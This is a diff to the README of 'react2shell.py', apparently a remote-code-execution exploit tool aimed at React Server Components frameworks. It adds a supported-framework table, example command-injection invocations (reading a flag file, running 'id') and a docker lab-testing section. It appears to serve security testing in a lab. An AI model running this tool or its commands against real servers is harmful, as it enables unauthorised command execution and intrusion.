@@ -28,6 +28,31 @@ python react2shell.py https://target.com -i
 python react2shell.py -L /path/to/project
 ```
 
+## Supported Frameworks
+
+| Framework | Flag | Output Method | Notes |
+|-----------|------|---------------|-------|
+| **Next.js** | `-F nextjs` (default) | X-Action-Redirect header | Full RCE with output |
+| **React Router** | `-F react-router` | X-Action-Redirect header | ESM-compatible payload |
+| **Waku** | `-F waku` | Blind (file write) | Requires `/RSC/F/{x}/{y}.txt` path |
+| **Expo** | `-F expo` | Varies | Experimental RSC support |
+| **Vite RSC** | `-F vite-rsc` | Varies | Plugin-based RSC |
+| **Parcel RSC** | `-F parcel-rsc` | Varies | Plugin-based RSC |
+
+### Framework-Specific Examples
+
+```bash
+# Next.js (default - auto-detected)
+python react2shell.py http://localhost:3011 -c "id"
+
+# React Router (ESM environment)
+python react2shell.py http://localhost:3015 -F react-router -c "id"
+
+# Waku (blind RCE - output written to /tmp/r2s_out.txt)
+python react2shell.py http://localhost:3014 -F waku -c "cat /app/flag.txt"
+# Then read output: docker exec <container> cat /tmp/r2s_out.txt
+```
+
 ## Features
 
 ### Scanning Modes
@@ -75,6 +100,18 @@ python react2shell.py targets.txt -t 20 -o results.json
 
 # Check local project
 python react2shell.py -L ./my-nextjs-app
+```
+
+## Lab Testing
+
+```bash
+# Start the lab environment
+cd ../lab && docker-compose up -d
+
+# Test each framework
+python react2shell.py http://localhost:3011 -c "id"              # Next.js
+python react2shell.py http://localhost:3015 -F react-router -c "id"  # React Router
+python react2shell.py http://localhost:3014 -F waku -c "id"      # Waku (blind)
 ```
 
 ## All Options
